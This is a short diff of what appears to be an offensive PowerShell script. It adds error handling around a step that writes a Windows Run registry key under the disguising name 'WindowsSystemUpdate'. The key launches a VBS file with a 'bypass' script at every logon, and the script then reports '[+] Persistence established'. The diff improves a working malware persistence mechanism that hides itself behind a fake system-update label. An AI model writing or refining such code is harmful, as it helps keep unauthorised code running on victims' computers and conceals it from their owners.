@@ -94,10 +94,15 @@ try {
         $vbsContent | Out-File -FilePath $vbsPath -Encoding ascii
         
         # Add to startup registry
-        $regPath = "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
-        $regName = "WindowsSystemUpdate"
-        $regValue = "wscript.exe `"$vbsPath`" `"$bypassScriptPath`""
-        Set-ItemProperty -Path $regPath -Name $regName -Value $regValue
+        try {
+            $regPath = "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
+            $regName = "WindowsSystemUpdate"
+            $regValue = "wscript.exe `"$vbsPath`" `"$bypassScriptPath`""
+            Set-ItemProperty -Path $regPath -Name $regName -Value $regValue
+            Write-Host "[+] Registry key added successfully"
+        } catch {
+            Write-Host "[!] Failed to add registry key: $_"
+        }
         
         Write-Host '[+] Persistence established'
 
